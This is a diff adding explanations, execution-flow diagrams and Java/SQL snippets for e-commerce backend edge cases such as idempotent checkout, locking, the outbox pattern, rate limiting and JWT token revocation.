@@ -32,8 +32,1239 @@
 | 19 | Graceful Shutdown | `server.shutdown: graceful` |
 | 20 | Input Sanitization | Parameterized queries + Bean Validation |
 
-> **Full explanations with trade-offs for cases 1–20 are in** [`ECOMMERCE_EDGE_CASES_V1.md`](./ECOMMERCE_EDGE_CASES_V1.md)
-> (or scroll down — both are in this file for completeness).
+> The full explanations with execution flows for cases 1–20 are directly below.
+
+---
+
+## Cases #1–#20 — Full Execution Flows
+
+---
+
+## Edge Case #1 — Idempotency Key (Duplicate Order Submission)
+
+### The Problem
+A user clicks "Place Order" on a slow connection. The server processes the order, but the
+HTTP response is lost in transit (network hiccup, mobile app killed, etc.). The client
+never sees a success response, so it retries — sending the same order again. Without
+protection you now have **two identical orders** charged to the same customer.
+
+This is the most financially dangerous silent failure in e-commerce. The customer doesn't
+know they placed two orders. The first they learn of it is when two packages arrive — or
+when they see two charges on their bank statement.
+
+### Execution Flow
+
+```
+Client                          Server                          Database
+  │                               │                                │
+  ├─── POST /orders/checkout ─────►│                               │
+  │    {idempotencyKey: "abc-123"} │                               │
+  │                               ├─── SELECT * FROM orders ──────►│
+  │                               │    WHERE idempotency_key =     │
+  │                               │    'abc-123'                   │
+  │                               │◄─── (no rows found) ───────────┤
+  │                               │                                │
+  │                               ├─── INSERT INTO orders ─────────►│
+  │                               │    (idempotency_key='abc-123') │
+  │                               │◄─── order created (id=99) ─────┤
+  │◄─── 201 Created ──────────────┤                                │
+  │     {orderId: 99}             │                                │
+  │                               │                                │
+  │  [network hiccup — client     │                                │
+  │   never receives response]    │                                │
+  │                               │                                │
+  ├─── POST /orders/checkout ─────►│  (RETRY — same key)           │
+  │    {idempotencyKey: "abc-123"} │                               │
+  │                               ├─── SELECT * FROM orders ──────►│
+  │                               │    WHERE idempotency_key =     │
+  │                               │    'abc-123'                   │
+  │                               │◄─── order row found (id=99) ───┤
+  │◄─── 200 OK (idempotent) ──────┤                                │
+  │     {orderId: 99}             │  (NO new order created)        │
+```
+
+### The Solution
+```java
+// DB schema: UNIQUE constraint is the real guard
+// idempotency_key VARCHAR(64) UNIQUE NOT NULL
+
+public OrderResponse checkout(UUID userId, CheckoutRequest req) {
+    // 1. Check if this key was already processed
+    return orderRepo.findByIdempotencyKey(req.idempotencyKey())
+        .map(existing -> buildResponse(existing))  // return cached result
+        .orElseGet(() -> createNewOrder(userId, req));  // first time only
+}
+```
+
+### Why This Approach?
+**The UNIQUE constraint IS the guard** — not the SELECT. If two concurrent requests with
+the same key slip through the `findByIdempotencyKey` check simultaneously, only one INSERT
+will succeed. The other gets `DataIntegrityViolationException` → caught → return the
+successfully inserted order.
+
+**Alternative: Time-window deduplication**
+> "Reject orders that look the same within 5 minutes."
+
+❌ **False positives.** A user who legitimately orders the same product twice in 5 minutes
+is rejected. Keys are explicit: the client opts in to idempotency.
+
+**Trade-off:** The client must generate and persist the key before the request. If the client
+crashes before persisting the key, it has no way to reconstruct it — it must generate a
+new one and accept the risk of duplication. This is acceptable: it's the client's responsibility.
+
+---
+
+## Edge Case #2 — Optimistic Locking (Concurrent Product Updates)
+
+### The Problem
+Two admin users both open the same product's edit page. Admin A changes the price to $99.
+Admin B (whose screen still shows the old price) changes the description and saves.
+Admin B's save also overwrites Admin A's price change — **the last write wins silently**,
+and Admin A's change is lost forever without any error.
+
+This is the classic "Lost Update" problem in concurrent systems.
+
+### Execution Flow
+
+```
+Time    Admin A                          DB                      Admin B
+  │     GET product (version=1)          │                         │
+  │                                      │     GET product (version=1)
+  │     [changes price to $99]           │                         │
+  │                                      │     [changes description]
+  │     UPDATE products                  │                         │
+  │     SET price=99, version=2          │                         │
+  │     WHERE id=X AND version=1 ───────►│                         │
+  │     (1 row affected — success) ◄─────┤                         │
+  │                                      │                         │
+  │                                      │     UPDATE products     │
+  │                                      │     SET desc=..., version=2
+  │                                      │     WHERE id=X AND version=1 ◄──
+  │                                      │     (0 rows — version mismatch!)
+  │                                      │     ────────────────────►│
+  │                                      │     409 Conflict         │
+  │                                      │                         │
+  │                               Admin B must re-fetch and re-apply │
+```
+
+### The Solution
+```java
+@Entity
+public class ProductEntity {
+    @Version
+    private Long version;  // Hibernate manages this automatically
+}
+
+// Hibernate generates: UPDATE products SET price=?, version=? WHERE id=? AND version=?
+// If WHERE version=? matches 0 rows → throws OptimisticLockingFailureException
+```
+The service catches `OptimisticLockingFailureException` → retries up to 3 times with a
+short backoff. If still failing after 3 retries, returns 409 Conflict to the client.
+
+**Trade-off:** Under high contention (many concurrent writes), retries add latency.
+This is by design — optimistic locking is best when conflicts are rare. If conflicts are
+frequent (hot product under a flash sale), switch to pessimistic locking (`SELECT FOR UPDATE`)
+for that specific operation.
+
+---
+
+## Edge Case #3 — Pessimistic Lock for Payment (Double Charge Prevention)
+
+### The Problem
+Two parallel payment service calls for the same order (retry + original both arrive at
+the payment service simultaneously). Without a lock, both read `payment_status = PENDING`,
+both proceed to charge the customer's card — **customer is charged twice**.
+
+This is worse than a lost update: it's financial fraud from the customer's perspective.
+
+### Execution Flow
+
+```
+Thread A (original request)          DB                  Thread B (retry)
+  │                                   │                        │
+  ├── BEGIN TRANSACTION ──────────────►                        │
+  ├── SELECT * FROM payments          │                        │
+  │   WHERE order_id = X             │                        │
+  │   FOR UPDATE ─────────────────────►                        │
+  │   (acquires row lock) ◄───────────┤                        │
+  │                                   │   BEGIN TRANSACTION ───►│
+  │                                   │   SELECT * FROM payments│
+  │                                   │   WHERE order_id = X   │
+  │                                   │   FOR UPDATE ──────────►│
+  │                                   │   (BLOCKS — waits) ◄───┤
+  ├── status = PENDING ✓              │                        │
+  ├── call payment gateway            │                        │
+  ├── UPDATE payments SET             │                        │
+  │   status = COMPLETED ─────────────►                        │
+  ├── COMMIT ─────────────────────────►                        │
+  │                                   │   (lock released)       │
+  │                                   │   Thread B acquires     │
+  │                                   │   lock ────────────────►│
+  │                                   │   reads status=COMPLETED│
+  │                                   │   → skips charge ◄──────┤
+  │                                   │   COMMIT ──────────────►│
+```
+
+### The Solution
+```java
+@Lock(LockModeType.PESSIMISTIC_WRITE)
+@Query("SELECT p FROM PaymentEntity p WHERE p.orderId = :orderId")
+Optional<PaymentEntity> findByOrderIdForUpdate(@Param("orderId") UUID orderId);
+
+public PaymentResponse processPayment(UUID orderId) {
+    PaymentEntity payment = paymentRepo.findByOrderIdForUpdate(orderId)
+        .orElseThrow(() -> new PaymentNotFoundException(orderId));
+    
+    if (payment.getStatus() != PaymentStatus.PENDING) {
+        return buildIdempotentResponse(payment);  // already processed — return safely
+    }
+    
+    // At this point only ONE thread can be here for this orderId
+    String chargeId = gateway.charge(payment.getAmount());
+    payment.setStatus(PaymentStatus.COMPLETED);
+    payment.setGatewayChargeId(chargeId);
+    return buildResponse(payment);
+}
+```
+
+**Trade-off:** All payment requests for the same order are serialized. This is intentional —
+correctness over throughput. Different orders don't block each other (lock is per-row).
+
+---
+
+## Edge Case #4 — Price Snapshot (Cart Price Drift)
+
+### The Problem
+A user adds an item to cart at $50. While they browse, the admin raises the price to $80.
+The user checks out. What price do they pay?
+
+- **Always live price:** User pays $80. Legally grey in many jurisdictions ("I added it at $50!").
+- **Always cart price:** Admin cannot correct a pricing mistake once any user has the item in cart.
+- **Snapshot + validation:** Store $50 at add-time. Warn at checkout if price has changed.
+
+### Execution Flow
+
+```
+User                             App                              DB
+  │                               │                               │
+  ├─── Add to cart ──────────────►│                               │
+  │                               ├─── SELECT price FROM products►│
+  │                               │◄─── price = $50.00 ───────────┤
+  │                               ├─── INSERT INTO cart_items ───►│
+  │                               │    (product_id, unit_price=$50)│
+  │◄─── Cart shows $50.00 ────────┤                               │
+  │                               │                               │
+  │  [Admin raises price to $80]  │                               │
+  │                               │                               │
+  ├─── Proceed to checkout ──────►│                               │
+  │                               ├─── SELECT current price ─────►│
+  │                               │◄─── price = $80.00 ───────────┤
+  │                               │                               │
+  │                               │  cart_price ($50) ≠           │
+  │                               │  current_price ($80)          │
+  │                               │                               │
+  │◄─── 409 PriceChangedException─┤                               │
+  │     "Price changed: $50→$80.  │                               │
+  │      Refresh to continue."    │                               │
+```
+
+### The Solution
+```java
+// 1. Snapshot at add-to-cart time
+cartItem.setUnitPrice(product.getPrice());  // stored in cart_items.unit_price
+
+// 2. Validate at checkout — BEFORE any payment
+for (CartItem item : cart.getItems()) {
+    BigDecimal currentPrice = productRepo.getCurrentPrice(item.getProductId());
+    if (item.getUnitPrice().compareTo(currentPrice) != 0) {
+        throw new PriceChangedException(item, currentPrice);
+    }
+}
+```
+
+**Why compareTo, not equals?** `BigDecimal("50.0").equals(BigDecimal("50.00"))` is `false`
+because equals also compares scale. `compareTo` compares value only.
+
+**Trade-off:** Users must re-confirm their cart on price changes, adding friction.
+This is the legally and user-experience correct trade-off in most markets.
+
+---
+
+## Edge Case #5 — Reservation TTL (Inventory Hold Expiry)
+
+### The Problem
+A user adds 5 laptops to cart. They browse for 2 hours without checking out. Meanwhile,
+10 other users can't buy those laptops because they appear "reserved." Eventually the user
+closes the browser tab without checking out — **5 laptops are permanently stuck in reserved
+state**, unavailable to anyone.
+
+### Execution Flow
+
+```
+User                         Scheduler                         DB
+  │                               │                             │
+  ├─ Add to cart ─────────────────────────────────────────────►│
+  │  (reservation created,        │                             │
+  │   expires_at = NOW + 30min)   │                             │
+  │                               │                             │
+  │  [user browses, 30 min pass]  │                             │
+  │                               │                             │
+  │               ┌───────────────┤                             │
+  │               │ @Scheduled    │                             │
+  │               │ (every 5min)  ├─ SELECT * FROM reservations►│
+  │               │               │  WHERE expires_at < NOW()  │
+  │               │               │  AND status = 'RESERVED'   │
+  │               │               │◄─ [5 laptop reservations] ──┤
+  │               │               │                             │
+  │               │               ├─ UPDATE inventory ──────────►│
+  │               │               │  SET reserved = reserved - 5│
+  │               │               ├─ UPDATE reservations ───────►│
+  │               │               │  SET status = 'EXPIRED'    │
+  │               └───────────────┤                             │
+  │                               │                             │
+  │  [Other users can now buy     │                             │
+  │   the 5 laptops again]        │                             │
+```
+
+### The Solution
+```java
+@Scheduled(fixedDelay = 300_000)  // every 5 minutes
+@Transactional
+public void expireReservations() {
+    List<InventoryReservation> expired = reservationRepo
+        .findByStatusAndExpiresAtBefore(ReservationStatus.RESERVED, Instant.now());
+    
+    for (InventoryReservation res : expired) {
+        inventoryRepo.releaseReservation(res.getProductId(), res.getQuantity());
+        res.setStatus(ReservationStatus.EXPIRED);
+    }
+}
+```
+
+**Why polling instead of scheduled per-reservation?**
+A per-reservation `ScheduledFuture` (one timer per cart item) requires in-memory state
+that's lost on server restart. A DB-backed polling job is crash-safe — on restart, it
+immediately finds and expires all overdue reservations.
+
+**Trade-off:** Up to 5-minute lag before expired reservations are released. For flash
+sales this matters; reduce the interval to 1 minute if needed (monitors DB load).
+
+---
+
+## Edge Case #6 — Soft Delete (Product Deactivation)
+
+### The Problem
+Admin deletes a product. But:
+- There are open orders referencing that product via `order_items.product_id`
+- There are customer reviews attached to that `product_id`
+- Financial records require the product data for audits (7-year retention law)
+
+A `DELETE FROM products WHERE id = X` would either:
+- Fail with FK constraint violation (if FK constraints enforce referential integrity)
+- Cascade-delete all orders/reviews (catastrophic data loss)
+- Break audit history
+
+### Execution Flow
+
+```
+Admin                           App                              DB
+  │                              │                               │
+  ├─ DELETE /products/123 ──────►│                               │
+  │                              ├─ productRepo.softDelete(123)─►│
+  │                              │  UPDATE products              │
+  │                              │  SET is_active = false,       │
+  │                              │      deleted_at = NOW()       │
+  │                              │  WHERE id = 123               │
+  │◄─ 200 OK ─────────────────── ┤                               │
+  │                              │                               │
+  │  [Catalog page]              │                               │
+  │                              ├─ findAll(active only) ───────►│
+  │                              │  SELECT * FROM products       │
+  │                              │  WHERE is_active = true       │
+  │                              │◄─ (product 123 not returned) ─┤
+  │                              │                               │
+  │  [Order history]             │                               │
+  │                              ├─ findByOrderId ──────────────►│
+  │                              │  SELECT * FROM order_items    │
+  │                              │  JOIN products ON product_id  │
+  │                              │◄─ (product 123 still found    │
+  │                              │    for historical display) ───┤
+```
+
+### The Solution
+```java
+@Entity
+public class ProductEntity {
+    @Column(nullable = false)
+    private boolean isActive = true;
+    
+    private Instant deletedAt;
+}
+
+// All catalog queries filter on is_active:
+@Query("SELECT p FROM ProductEntity p WHERE p.isActive = true")
+List<ProductEntity> findAllActive();
+```
+
+Add a partial index for performance:
+```sql
+CREATE INDEX idx_products_active ON products(id) WHERE is_active = true;
+```
+Queries with `WHERE is_active = true` use this index — inactive products are excluded
+from the index entirely, so they add zero overhead to catalog reads.
+
+**Trade-off:** Ghost rows accumulate over time. Periodic archival jobs can move
+`is_active=false` rows older than N years to a cold storage table.
+
+---
+
+## Edge Case #7 — Concurrent Cart Lock (Cart Quantity Race)
+
+### The Problem
+User clicks "+" on a cart item to increase quantity. Their slow network causes a double-click,
+sending two concurrent `PATCH /cart/items/{id}` requests. Both read `quantity = 2`.
+Both increment to `3`. Both save `quantity = 3`. **The actual result: quantity = 3, not 4.**
+
+### Execution Flow
+
+```
+Request A                        DB                     Request B
+  │                               │                          │
+  ├─ SELECT * FROM cart_items     │                          │
+  │  WHERE id=X FOR UPDATE ──────►│                          │
+  │  (lock acquired) ◄────────────┤                          │
+  │                               │   SELECT * FROM cart_items
+  │                               │   WHERE id=X FOR UPDATE ─►│
+  │                               │   (BLOCKS — waits) ◄──────┤
+  ├─ read quantity=2              │                          │
+  ├─ UPDATE SET quantity=3 ──────►│                          │
+  ├─ COMMIT ──────────────────────►                          │
+  │                               │   (lock released)        │
+  │                               │   Request B acquires lock►│
+  │                               │   reads quantity=3       │
+  │                               │   UPDATE SET quantity=4 ─►│
+  │                               │   COMMIT ────────────────►│
+  │                               │                          │
+  │                 Final quantity = 4 (CORRECT) ✓           │
+```
+
+### The Solution
+```java
+@Lock(LockModeType.PESSIMISTIC_WRITE)
+@Query("SELECT c FROM CartItemEntity c WHERE c.id = :id")
+Optional<CartItemEntity> findByIdForUpdate(@Param("id") UUID id);
+```
+
+The `FOR UPDATE` lock serializes concurrent modifications to the same cart item.
+The second request waits for the first to complete, then reads the updated value and
+applies its change on top of it correctly.
+
+**Trade-off:** Concurrent edits to the same cart item are serialized (one waits for the other).
+This is almost always the correct behavior — a user adding quantity should be sequential.
+
+---
+
+## Edge Case #8 — Order State Machine (Invalid Status Transitions)
+
+### The Problem
+An order goes through: `PENDING → CONFIRMED → SHIPPED → DELIVERED`.
+Without enforcement, a bug in a payment webhook could directly set a `DELIVERED` order back
+to `PENDING`. A refund handler could trigger on a `CANCELLED` order. Support tools could
+accidentally cancel a `DELIVERED` order.
+
+Invalid transitions don't just corrupt data — they trigger cascading side effects
+(re-issuing notifications, incorrect inventory adjustments, wrong financial entries).
+
+### Execution Flow
+
+```
+[Valid transition]
+PENDING ──► CONFIRMED ──► SHIPPED ──► DELIVERED
+                                          │
+                                     COMPLETED or
+                                     REFUND_REQUESTED
+
+[Invalid transition — BLOCKED]
+DELIVERED ──X──► PENDING
+                 "Cannot transition from DELIVERED to PENDING"
+```
+
+### The Solution
+```java
+public enum OrderStatus {
+    PENDING, CONFIRMED, SHIPPED, DELIVERED, COMPLETED,
+    CANCELLED, REFUND_REQUESTED, REFUNDED;
+
+    private static final Map<OrderStatus, Set<OrderStatus>> VALID_TRANSITIONS = Map.ofEntries(
+        Map.entry(PENDING,           Set.of(CONFIRMED, CANCELLED)),
+        Map.entry(CONFIRMED,         Set.of(SHIPPED, CANCELLED)),
+        Map.entry(SHIPPED,           Set.of(DELIVERED)),
+        Map.entry(DELIVERED,         Set.of(COMPLETED, REFUND_REQUESTED)),
+        Map.entry(REFUND_REQUESTED,  Set.of(REFUNDED, CONFIRMED)),
+        Map.entry(COMPLETED,         Set.of()),
+        Map.entry(CANCELLED,         Set.of()),
+        Map.entry(REFUNDED,          Set.of())
+    );
+
+    public void validateTransitionTo(OrderStatus next) {
+        if (!VALID_TRANSITIONS.get(this).contains(next)) {
+            throw new InvalidOrderTransitionException(this, next);
+        }
+    }
+}
+
+// Usage in service:
+order.getStatus().validateTransitionTo(newStatus);  // throws if invalid
+order.setStatus(newStatus);
+```
+
+**Trade-off:** Every new business requirement (e.g., "allow re-opening a COMPLETED order")
+requires adding a new valid transition. This is a **feature**, not a bug — it forces
+explicit business approval before a new path is allowed.
+
+---
+
+## Edge Case #9 — Duplicate Payment (Payment Webhook Dedup)
+
+### The Problem
+Payment gateways (Stripe, VNPay) often deliver webhooks multiple times for the same
+event ("at-least-once delivery"). If the first webhook delivery succeeds but the response
+is slow (network hiccup), the gateway retries the webhook. Your handler processes the
+same payment completion event twice — charging the customer's card twice.
+
+### Execution Flow
+
+```
+Gateway                         App                              DB
+  │                               │                               │
+  ├─ POST /webhooks/payment ──────►│                               │
+  │  {chargeId: "ch_abc123",      │                               │
+  │   status: "completed"}        ├─── INSERT INTO payments ──────►│
+  │                               │    (charge_id='ch_abc123',    │
+  │                               │     status=COMPLETED)         │
+  │  [response slow...]           │◄─── INSERT OK ────────────────┤
+  │                               │                               │
+  │  [Gateway assumes failure,    │                               │
+  │   retries after 5 seconds]    │                               │
+  │                               │                               │
+  ├─ POST /webhooks/payment ──────►│                               │
+  │  {chargeId: "ch_abc123", ...} │                               │
+  │                               ├─── INSERT INTO payments ──────►│
+  │                               │    UNIQUE(charge_id) violated │
+  │                               │◄─── DataIntegrityViolation ───┤
+  │                               │                               │
+  │                               │  catch → return 200 OK        │
+  │◄─── 200 OK ───────────────────┤  (gateway stops retrying)     │
+  │                               │  No double charge ✓           │
+```
+
+### The Solution
+```sql
+-- Schema-level deduplication
+ALTER TABLE payments ADD CONSTRAINT payments_charge_id_unique UNIQUE (gateway_charge_id);
+```
+```java
+try {
+    paymentRepo.save(newPayment);
+} catch (DataIntegrityViolationException e) {
+    if (isUniqueConstraintViolation(e)) {
+        log.info("Duplicate webhook for chargeId={}, ignoring", chargeId);
+        return;  // idempotent — success
+    }
+    throw e;
+}
+```
+
+**Why return 200 to the gateway?** If you return 4xx or 5xx on a duplicate, the gateway
+retries indefinitely (it doesn't know the duplicate was intentional). Return 200 to
+signal "received and processed" — the gateway stops retrying.
+
+**Trade-off:** Requires catching `DataIntegrityViolationException` — a generic exception
+that could mask real errors. The `isUniqueConstraintViolation()` helper inspects the
+SQL state code (`23505` in PostgreSQL) to confirm it's specifically a unique violation.
+
+---
+
+## Edge Case #10 — Refund State Machine (Concurrent Refund Prevention)
+
+### The Problem
+A customer submits a refund request. Their support agent also initiates a refund from the
+admin panel simultaneously. Two concurrent refund requests reach the service. Without
+protection, both pass the `status = DELIVERED` check and two refunds are issued —
+**double refund to the customer, double loss to the business**.
+
+### Execution Flow
+
+```
+State Machine:
+  DELIVERED ──► REFUND_REQUESTED ──► REFUNDED
+                     │
+                     └──► REFUND_FAILED (→ human review)
+
+Concurrent requests:
+  Thread A                         DB                     Thread B
+  │                                 │                          │
+  ├─ SELECT FOR UPDATE order ──────►│                          │
+  │  (lock acquired)                │                          │
+  │                                 │  Thread B blocks at      │
+  │                                 │  SELECT FOR UPDATE ───────►│
+  ├─ status = DELIVERED ✓           │                          │
+  ├─ UPDATE status=REFUND_REQUESTED►│                          │
+  ├─ call gateway.refund()          │                          │
+  ├─ UPDATE status=REFUNDED ───────►│                          │
+  ├─ COMMIT ───────────────────────►│                          │
+  │                                 │  Thread B acquires lock ─►│
+  │                                 │  status = REFUNDED ≠ DELIVERED
+  │                                 │  → throws InvalidTransition │
+  │                                 │  → 409 Conflict ◄──────────┤
+```
+
+### The Solution
+```java
+// State machine prevents the transition:
+// REFUNDED.validateTransitionTo(REFUND_REQUESTED) → throws InvalidOrderTransitionException
+
+// Pessimistic lock prevents the race:
+OrderEntity order = orderRepo.findByIdForUpdate(orderId);
+order.getStatus().validateTransitionTo(OrderStatus.REFUND_REQUESTED);
+// From this point, only one thread processes the refund
+```
+
+**Trade-off:** `REFUND_FAILED` is a terminal state requiring human review — the system
+cannot automatically retry a failed refund (the gateway might have partially processed it).
+An alert fires when any order reaches `REFUND_FAILED`; ops investigates and re-triggers manually.
+
+---
+
+## Edge Case #11 — Outbox Pattern (Reliable Event Publishing)
+
+### The Problem
+After a successful checkout, you need to:
+1. Send an order confirmation email
+2. Update analytics
+3. Notify the warehouse system
+
+Naive approach:
+```java
+@Transactional
+public void checkout() {
+    saveOrder();           // DB write — succeeds
+    emailService.send();   // HTTP call — FAILS (email provider down)
+    // Transaction is rolled back? No — DB already committed above.
+    // Email never sent, order exists, customer never notified.
+}
+```
+
+Or the reverse: `emailService.send()` succeeds, then `saveOrder()` fails — an email
+is sent for an order that doesn't exist.
+
+### Execution Flow
+
+```
+Checkout (single transaction):              Outbox Poller (background):
+                                            [runs every 500ms]
+  ┌─────────────────────────────┐
+  │  BEGIN TRANSACTION          │           ┌─────────────────────────────┐
+  │  INSERT INTO orders ...     │           │  SELECT * FROM outbox_msgs  │
+  │  INSERT INTO outbox_messages│           │  WHERE status = 'PENDING'   │
+  │  {type:'ORDER_CREATED',     │   ───►    │  LIMIT 10                   │
+  │   payload: {...},           │           │                             │
+  │   status: 'PENDING'}        │           │  For each message:          │
+  │  COMMIT ✓                   │           │    call email/notification  │
+  └─────────────────────────────┘           │    service                  │
+                                            │    UPDATE status='PUBLISHED'│
+  If email service is down at              │                             │
+  checkout time — order still             │  If service fails:           │
+  saves. Poller retries the email          │    retry_count++             │
+  when it comes back online.              │    next_retry_at = NOW +     │
+                                            │    exponential_backoff       │
+                                            └─────────────────────────────┘
+```
+
+### The Solution
+```java
+@Transactional
+public CheckoutResponse checkout(UUID userId, CheckoutRequest req) {
+    OrderEntity order = createOrder(userId, req);
+    
+    // Write the "intent to notify" in the SAME transaction as the order
+    OutboxMessage msg = OutboxMessage.of("ORDER_CREATED", order.getId(), buildPayload(order));
+    outboxRepo.save(msg);
+    
+    return buildResponse(order);  // transaction commits both order + outbox message atomically
+}
+```
+
+**Trade-off:** Notifications are delivered ~500ms after the order is saved (polling interval),
+not synchronously. For order confirmation emails, this is acceptable. For real-time
+in-app notifications, reduce the polling interval or use `LISTEN/NOTIFY` (PostgreSQL
+push mechanism) to wake the poller immediately.
+
+---
+
+## Edge Case #12 — Rate Limiting (Preventing Abuse)
+
+### The Problem
+A malicious bot (or a poorly-written third-party integration) hammers your product search
+endpoint 10,000 times per minute. Without rate limiting:
+- DB connection pool exhausted → all users get errors
+- Search indexes thrashed → degraded performance for everyone
+- Competitor scraping your entire product catalog
+
+### Execution Flow
+
+```
+Client                          AOP RateLimitAspect              DB
+  │                               │                               │
+  ├─ GET /products/search ────────►│                               │
+  │  [1st request]                ├─ check counter for IP/user   │
+  │                               │  counter = 0 → allow         │
+  │                               │  counter++ (counter=1)       │
+  │◄─ 200 OK ─────────────────────┤                               │
+  │                               │                               │
+  ├─ GET /products/search ─ (×98)─►│                               │
+  │  [requests 2–99]              │  counter = 98 → allow        │
+  │                               │  counter++ each time         │
+  │◄─ 200 OK ─────────────────────┤                               │
+  │                               │                               │
+  ├─ GET /products/search ────────►│                               │
+  │  [100th request in 1 minute]  ├─ counter = 99 → ALLOW        │
+  │                               │  counter++ (counter=100)     │
+  │◄─ 200 OK ─────────────────────┤                               │
+  │                               │                               │
+  ├─ GET /products/search ────────►│                               │
+  │  [101st request in 1 minute]  ├─ counter = 100 → REJECT      │
+  │◄─ 429 Too Many Requests ──────┤                               │
+  │   Retry-After: 47s            │                               │
+```
+
+### The Solution
+```java
+@Aspect
+@Component
+public class RateLimitAspect {
+    private final Map<String, RateLimitEntry> store = new ConcurrentHashMap<>();
+
+    @Around("@annotation(rateLimited)")
+    public Object enforce(ProceedingJoinPoint pjp, RateLimited rateLimited) {
+        String key = buildKey(request);  // userId or IP
+        RateLimitEntry entry = store.computeIfAbsent(key, k -> new RateLimitEntry());
+        
+        if (entry.isExceeded(rateLimited.maxRequests(), rateLimited.windowSeconds())) {
+            throw new RateLimitExceededException(entry.getRetryAfterSeconds());
+        }
+        
+        return pjp.proceed();
+    }
+}
+```
+
+**Usage:**
+```java
+@GetMapping("/products/search")
+@RateLimited(maxRequests = 100, windowSeconds = 60)
+public Page<ProductResponse> search(...) { ... }
+```
+
+**Trade-off:** This is an in-memory, single-JVM implementation. With 3 app servers, a user
+gets 100 requests per server = 300 per minute across the cluster. For production multi-instance
+setups, replace the `ConcurrentHashMap` with a Redis counter (`INCR` + `EXPIRE`).
+
+---
+
+## Edge Case #13 — Read-After-Write Consistency
+
+### The Problem
+User updates their shipping address. The app saves the update (write goes to primary DB),
+then immediately fetches their profile to show a confirmation page. With read replicas,
+the fetch goes to a replica that hasn't received the replication yet — **the user sees
+their OLD address on the confirmation page**, thinking the update didn't save.
+
+This erodes user trust. The user re-submits → creates duplicate update → potentially
+checkout goes to the wrong old address.
+
+### Execution Flow
+
+```
+Without fix:
+  User                  App                  Primary DB       Replica DB
+    │  PUT /profile ─────►│                       │                │
+    │                     ├─── UPDATE ────────────►│                │
+    │                     │◄─── OK ───────────────┤                │
+    │  GET /profile ──────►│                       │   [replication lag ~100ms]
+    │                     ├─── SELECT ─────────────────────────────►│
+    │                     │◄─── OLD DATA ──────────────────────────┤
+    │◄── Shows old address ┤                       │                │
+    │                     │                       │                │
+With fix (sticky read):
+    │  PUT /profile ─────►│                       │                │
+    │                     ├─── UPDATE ────────────►│                │
+    │  GET /profile ──────►│  [same request context]               │
+    │                     ├─── SELECT ────────────►│  (reads from primary)
+    │                     │◄─── NEW DATA ──────────┤                │
+    │◄── Shows new address ┤                       │                │
+```
+
+### The Solution
+```java
+// Mark write operations — subsequent reads in the same request go to primary
+@Transactional  // read-write → connects to primary
+public UserProfile updateProfile(UUID userId, UpdateProfileRequest req) {
+    UserProfile profile = userRepo.findById(userId).orElseThrow();
+    profile.update(req);
+    return userRepo.save(profile);
+}
+
+// For pure reads, explicitly route to replica:
+@Transactional(readOnly = true)  // → can route to replica
+public UserProfile getProfile(UUID userId) {
+    return userRepo.findById(userId).orElseThrow();
+}
+```
+
+In the controller, `updateProfile` returns the saved entity directly — no second fetch needed.
+
+**Trade-off:** `@Transactional(readOnly=true)` is a hint to the routing infrastructure.
+Without a read/write routing data source (like Spring's `AbstractRoutingDataSource`), this
+only helps Hibernate optimize (no flush, no dirty checking). For full read-replica routing,
+configure a `ReadWriteRoutingDataSource`.
+
+---
+
+## Edge Case #14 — Atomic SQL Decrement (Flash Sale Inventory)
+
+### The Problem
+Flash sale: 100 units of a product. 500 users simultaneously click "Buy."
+Naive approach:
+```java
+Product product = productRepo.findById(id);  // reads stock=100
+if (product.getStock() > 0) {               // all 500 pass this check
+    product.setStock(product.getStock() - 1);
+    productRepo.save(product);              // all 500 write... result: stock=-400
+}
+```
+The `read-check-write` pattern has a race condition window of microseconds — enough
+for all 500 concurrent requests to pass the check simultaneously.
+
+### Execution Flow
+
+```
+500 concurrent requests for the same product (stock=100):
+
+Naive (WRONG):                        Atomic SQL (CORRECT):
+  All 500 read stock=100              SQL: UPDATE products
+  All 500 check stock > 0 → PASS           SET stock = stock - 1
+  All 500 write stock = 99            WHERE id = X AND stock >= 1
+  Result: stock = 99 (lost updates!)
+                                      DB executes this atomically.
+  Or with optimistic locking:         100 requests succeed (affected=1).
+  500 reads, 499 retries...           400 requests get affected=0
+  "thundering herd" — a storm of      → throw InsufficientStockException.
+  retries all competing, many
+  failing again → cascading retries   No thundering herd.
+                                      Linear performance.
+```
+
+### The Solution
+```java
+@Modifying
+@Query("""
+    UPDATE ProductEntity p SET p.stock = p.stock - :quantity
+    WHERE p.id = :productId AND p.stock >= :quantity
+    """)
+int decrementStock(@Param("productId") UUID productId, @Param("quantity") int quantity);
+
+// In service:
+int rowsAffected = productRepo.decrementStock(productId, quantity);
+if (rowsAffected == 0) {
+    throw new InsufficientStockException(productId, quantity);
+}
+```
+
+**Why `AND p.stock >= :quantity` in the WHERE clause?**
+The check and the decrement happen as a single atomic DB operation. No other transaction
+can read and modify `stock` between the check and the update — it's one statement.
+
+**Trade-off:** The `@Version` field on `ProductEntity` becomes stale after this update
+(Hibernate didn't increment it). If you use both `@Version` and `@Modifying` updates on
+the same entity in the same request, you may get `OptimisticLockingFailureException`.
+Solution: use `@Modifying` for inventory, `@Version` for product metadata — never both
+on the same field.
+
+---
+
+## Edge Case #15 — JWT Token Version (Immediate Token Revocation)
+
+### The Problem
+A user reports their account was compromised. You change their password. But their old
+JWT token is still valid for another 23 hours — a thief with the stolen token can continue
+making requests for 23 hours after the password change.
+
+Standard JWT has **no revocation mechanism** — once issued, a token is valid until it expires.
+
+### Execution Flow
+
+```
+Attacker                        App                              DB
+  │                               │                               │
+  │  [steals token, version=3]    │                               │
+  │                               │                               │
+  │  User resets password ─────────────────────────────────────►  │
+  │                               │  UPDATE users                 │
+  │                               │  SET token_version = 4 ──────►│
+  │                               │                               │
+  ├─ GET /orders (stolen token) ──►│                               │
+  │  {userId: X, version: 3}      │                               │
+  │                               ├─ SELECT token_version ───────►│
+  │                               │  FROM users WHERE id = X      │
+  │                               │◄─ token_version = 4 ──────────┤
+  │                               │                               │
+  │                               │  token.version (3) ≠          │
+  │                               │  db.version (4) → REJECT      │
+  │◄─ 401 Unauthorized ───────────┤                               │
+  │   "Token revoked"             │                               │
+```
+
+### The Solution
+```java
+// Token claim includes version:
+// {sub: "userId", version: 3, exp: ...}
+
+// JWT filter validation:
+public boolean validateToken(String token) {
+    Claims claims = Jwts.parser().parseClaimsJws(token).getBody();
+    int tokenVersion = claims.get("version", Integer.class);
+    
+    // DB lookup (cached in Redis for performance):
+    int currentVersion = userRepo.getTokenVersion(claims.getSubject());
+    
+    return tokenVersion == currentVersion;
+}
+
+// On password change / logout-all:
+userRepo.incrementTokenVersion(userId);  // invalidates ALL existing tokens
+```
+
